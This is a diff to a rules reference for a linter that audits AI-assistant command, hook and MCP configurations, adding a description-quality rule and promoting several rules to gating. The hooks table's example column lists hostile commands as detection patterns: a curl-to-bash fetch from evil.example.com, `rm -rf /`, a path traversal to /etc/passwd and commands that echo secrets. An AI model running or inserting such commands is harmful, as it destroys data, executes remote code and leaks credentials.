@@ -1,6 +1,6 @@
 # Rules Reference
 
-Complete reference for all 107 deterministic lint rules and the LLM-based review system.
+Complete reference for all 108 deterministic lint rules and the LLM-based review system.
 
 ## How rules work
 
@@ -69,7 +69,8 @@ and verified against the registry in CI. Do not edit it by hand.
 | `claude-md/skill-duplication` | advisory | PAIRWISE |
 | `command/allowed-tools-coverage` | advisory | FILE |
 | `command/data-exfiltration` | advisory | FILE |
-| `command/description-required` | advisory | FILE |
+| `command/description-quality` | advisory | FILE |
+| `command/description-required` | gating | FILE |
 | `command/duplicate-detection` | advisory | PAIRWISE |
 | `command/no-credential-access` | advisory | FILE |
 | `command/no-prompt-injection` | advisory | FILE |
@@ -80,7 +81,7 @@ and verified against the registry in CI. Do not edit it by hand.
 | `command/shadows-builtin` | advisory | FILE |
 | `command/skill-overlap` | advisory | PAIRWISE |
 | `content/allowed-tools-auto-approve` | advisory | FILE |
-| `content/broken-references` | advisory | FILE_FS |
+| `content/broken-references` | gating | FILE_FS |
 | `content/circular-references` | advisory | SETUP |
 | `content/description-length` | advisory | FILE |
 | `content/duplicate-detection` | advisory | PAIRWISE |
@@ -96,7 +97,7 @@ and verified against the registry in CI. Do not edit it by hand.
 | `cross/multi-assistant-drift` | gating | PAIRWISE |
 | `cross/overpermissive-grants` | gating | FILE |
 | `frontmatter/description-quality` | advisory | FILE |
-| `frontmatter/description-required` | advisory | FILE |
+| `frontmatter/description-required` | gating | FILE |
 | `frontmatter/format-valid` | gating | FILE |
 | `hooks/api-key-helper` | advisory | FILE |
 | `hooks/base-url-override` | advisory | FILE |
@@ -115,7 +116,7 @@ and verified against the registry in CI. Do not edit it by hand.
 | `hooks/pre-trust-permissions` | advisory | FILE |
 | `hooks/script-boundary` | advisory | FILE |
 | `hooks/silent-failure-masking` | advisory | FILE |
-| `hooks/valid-structure` | advisory | FILE |
+| `hooks/valid-structure` | gating | FILE |
 | `mcp/auto-approve-risk` | advisory | FILE |
 | `mcp/cross-assistant-divergence` | advisory | PAIRWISE |
 | `mcp/endpoint-integrity` | gating | FILE_FS |
@@ -237,6 +238,7 @@ These rules run against every discovered command definition. Applies to: CC, CU,
 | Rule | Type | What it does | Example | Built with |
 |------|------|-------------|---------|------------|
 | `command/description-required` | structural | Commands must have a `description` in frontmatter. This is what appears in the slash-command menu, so without it users can't tell what the command does. | Command `.md` file has no `description:` in frontmatter | YAML field check |
+| `command/description-quality` | frontmatter | Command descriptions should say what the command does in more than two words. A two-word label is too vague for the UI menu. | Description is `Run tests` instead of `Run the repository test suite` | Word-count heuristic |
 | `command/script-exists` | structural | Script files referenced in the command body must exist on disk. A broken script reference means the command fails every time. | Command says `Run ./scripts/deploy.sh` but the file was deleted | File existence check |
 | `command/duplicate-detection` | content | Finds commands that are near-copies of each other. Duplicate commands confuse users and waste maintenance effort. | `/format-code` and `/lint-code` have 90% identical content | TF-IDF cosine similarity |
 | `command/skill-overlap` | content | Detects commands that duplicate content already in a skill. If a skill covers the same thing, the command is redundant. | Command `/review` has the same instructions as the `code-review` skill | TF-IDF similarity |
@@ -279,7 +281,7 @@ These rules run against hook definitions. Applies to: CC, CU.
 
 | Rule | Type | What it does | Example | Built with |
 |------|------|-------------|---------|------------|
-| `hooks/valid-structure` | structural | Hook definitions must have valid structure: correct event types, well-formed matchers, expected fields. Invalid hooks are silently ignored by the runtime. | Missing event type, or `command` field is an object instead of a string | JSON schema validation |
+| `hooks/valid-structure` | structural | Hook entries must define a command. An entry with no command is ignored by the runtime. | A `PreToolUse` hook has a `matcher` but no `command` | JSON field check |
 | `hooks/script-boundary` | security | Hook scripts must stay within the project directory. Path traversal in hooks could read or execute files outside the project. | Hook command contains `../../etc/passwd` or `/usr/bin/malicious` | Path traversal detection |
 | `hooks/dangerous-command` | security | Flags hooks that run destructive or dangerous shell commands. Hooks run automatically on every event, so a dangerous command fires repeatedly. | `rm -rf /`, `chmod 777 .`, `curl http://evil.example.com/script \| bash` in a hook | Pattern matching |
 | `hooks/env-leakage` | security | Flags hooks that might leak environment variables to stdout or external processes. Hook output is visible and could expose secrets. | `echo $SECRET_KEY` or `env \| grep API` in a hook command | Pattern matching |
